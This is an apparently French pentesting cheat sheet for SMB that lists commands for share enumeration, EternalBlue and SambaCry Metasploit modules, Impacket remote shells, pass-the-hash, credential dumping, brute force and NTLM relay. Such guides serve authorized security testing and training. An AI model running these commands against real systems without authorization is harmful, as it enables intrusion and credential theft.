# Exploitation SMB - Guide complet

Guide complet pour l'énumération et l'exploitation du protocole SMB (Server Message Block).

**Ports** : 139 (NetBIOS), 445 (SMB direct)

---

## Installation des outils

### Impacket (indispensable)

```bash
# Créer un environnement virtuel dédié
python3 -m venv ~/tools/impacket-venv
source ~/tools/impacket-venv/bin/activate

# Installer Impacket
pip install impacket

# Ou depuis les sources (version la plus récente)
git clone https://github.com/fortra/impacket.git ~/tools/impacket
cd ~/tools/impacket
pip install .

# Créer un alias (à ajouter dans ~/.zshrc ou ~/.bashrc)
echo 'alias impacket-env="source ~/tools/impacket-venv/bin/activate"' >> ~/.zshrc
```

### smbclient (généralement pré-installé)

```bash
# macOS
brew install samba

# Linux (Debian/Ubuntu)
sudo apt install smbclient

# Linux (Arch)
sudo pacman -S smbclient
```

### enum4linux-ng (meilleur que l'original)

```bash
# Cloner le repo
git clone https://github.com/cddmp/enum4linux-ng.git ~/tools/enum4linux-ng
cd ~/tools/enum4linux-ng

# Installer les dépendances
pip install -r requirements.txt

# Ou via pipx (recommandé)
pipx install enum4linux-ng
```

### crackmapexec / netexec

```bash
# NetExec (successeur de CrackMapExec)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Ou CrackMapExec
pipx install crackmapexec
```

### smbmap

```bash
# Via pip
pip install smbmap

# Ou cloner
git clone https://github.com/ShawnDEvans/smbmap.git ~/tools/smbmap
cd ~/tools/smbmap
pip install -r requirements.txt
```

---

## Phase 1 : Énumération

### Scan Nmap

```bash
# Scan rapide des ports SMB
nmap -p 139,445 -sV <IP>

# Scripts NSE SMB
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery <IP>

# Vérifier les vulnérabilités connues
nmap -p 139,445 --script=smb-vuln* <IP>
```

### Énumération anonyme

```bash
# enum4linux-ng (le plus complet)
enum4linux-ng -A <IP>

# smbclient - lister les partages (anonyme)
smbclient -N -L //<IP>

# smbmap - lister les partages et permissions
smbmap -H <IP>
smbmap -H <IP> -u '' -p ''        # Null session
smbmap -H <IP> -u 'guest' -p ''   # Guest

# crackmapexec / netexec
netexec smb <IP> --shares
netexec smb <IP> --shares -u '' -p ''
```

### Énumération avec credentials

```bash
# smbclient
smbclient -L //<IP> -U '<user>%<password>'

# smbmap
smbmap -H <IP> -u '<user>' -p '<password>'
smbmap -H <IP> -u '<user>' -p '<password>' -d <DOMAIN>

# netexec
netexec smb <IP> -u '<user>' -p '<password>' --shares
```

### Connexion à un partage

```bash
# Connexion anonyme
smbclient //<IP>/<share> -N

# Avec credentials
smbclient //<IP>/<share> -U '<user>%<password>'

# Commandes utiles dans smbclient
# ls           - lister les fichiers
# cd <dir>     - changer de répertoire
# get <file>   - télécharger un fichier
# mget *       - télécharger tous les fichiers
# put <file>   - uploader un fichier
# recurse ON   - activer la récursion
# prompt OFF   - désactiver les confirmations
# mget *       - télécharger tout récursivement
```

### Télécharger tous les fichiers d'un partage

```bash
# Méthode 1 : smbclient
smbclient //<IP>/<share> -N -c 'recurse ON; prompt OFF; mget *'

# Méthode 2 : smbget (récursif)
smbget -R smb://<IP>/<share> -U '<user>%<password>'

# Méthode 3 : mount (Linux)
sudo mount -t cifs //<IP>/<share> /mnt/smb -o username=<user>,password=<password>
```

---

## Phase 2 : Exploitation

### Vulnérabilités connues

#### EternalBlue (MS17-010) - Windows 7/Server 2008

```bash
# Vérifier la vulnérabilité
nmap -p 445 --script=smb-vuln-ms17-010 <IP>

# Exploitation avec Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <VOTRE_IP>
run
```

#### SambaCry (CVE-2017-7494) - Samba < 4.6.4

```bash
# Vérifier la version
nmap -p 445 --script=smb-os-discovery <IP>

# Metasploit
use exploit/linux/samba/is_known_pipename
set RHOSTS <IP>
run
```

#### SMBGhost (CVE-2020-0796) - Windows 10/Server 2019

```bash
# Scanner
nmap -p 445 --script=smb-vuln-cve-2020-0796 <IP>
```

### Exécution de commandes avec Impacket

```bash
# Activer l'environnement
source ~/tools/impacket-venv/bin/activate

# psexec - Shell interactif (écrit sur le disque)
impacket-psexec '<domain>/<user>:<password>@<IP>'
impacket-psexec 'administrator:P@ssw0rd@<IP>'

# smbexec - Shell semi-interactif (plus discret)
impacket-smbexec '<domain>/<user>:<password>@<IP>'

# wmiexec - Via WMI (ne touche pas au disque)
impacket-wmiexec '<domain>/<user>:<password>@<IP>'

# atexec - Via Task Scheduler
impacket-atexec '<domain>/<user>:<password>@<IP>' 'whoami'

# Avec hash NTLM (Pass-the-Hash)
impacket-psexec -hashes ':<NTLM_HASH>' 'administrator@<IP>'
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>' 'administrator@<IP>'
```

### Récupération de credentials

```bash
# Dump SAM (local accounts)
impacket-secretsdump '<domain>/<user>:<password>@<IP>'

# Dump LSA secrets
impacket-secretsdump -just-dc '<domain>/<user>:<password>@<IP>'

# Avec netexec
netexec smb <IP> -u '<user>' -p '<password>' --sam
netexec smb <IP> -u '<user>' -p '<password>' --lsa
netexec smb <IP> -u '<user>' -p '<password>' --ntds  # Domain Controller
```

### Brute-force

```bash
# netexec (rapide, gère le lockout)
netexec smb <IP> -u users.txt -p passwords.txt
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success

# Hydra
hydra -L users.txt -P passwords.txt smb://<IP>
```

### Relay attacks

```bash
# Vérifier si SMB signing est désactivé
netexec smb <IP> --gen-relay-list relay.txt

# ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Responder + ntlmrelayx
sudo responder -I eth0 -rdw
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # Shell interactif
```

---

## Phase 3 : Post-exploitation

### Upload de fichiers

```bash
# smbclient
smbclient //<IP>/<share> -U '<user>%<password>' -c 'put local_file.exe remote_file.exe'

# smbmap
smbmap -H <IP> -u '<user>' -p '<password>' --upload 'local_file.exe' '<share>/remote_file.exe'

# Impacket
impacket-smbclient '<domain>/<user>:<password>@<IP>'
# Puis: use <share>, put <file>
```

### Recherche de fichiers sensibles

```bash
# smbmap - recherche récursive
smbmap -H <IP> -u '<user>' -p '<password>' -R

# Rechercher des fichiers spécifiques
smbmap -H <IP> -u '<user>' -p '<password>' -R -A '\.txt$|\.xml$|\.ini$|\.config$|password|credential'

# Spider avec netexec
netexec smb <IP> -u '<user>' -p '<password>' -M spider_plus
```

---

## Résumé rapide

```bash
# 1. Énumération rapide
netexec smb <IP> --shares -u '' -p ''
smbclient -N -L //<IP>

# 2. Connexion à un partage
smbclient //<IP>/<share> -N

# 3. Exécution de commandes (si admin)
impacket-psexec 'user:password@<IP>'

# 4. Dump credentials
impacket-secretsdump 'user:password@<IP>'
```

---

## Références

- [HackTricks - SMB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [NetExec Wiki](https://www.netexec.wiki/)
- [PayloadsAllTheThings - SMB](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)
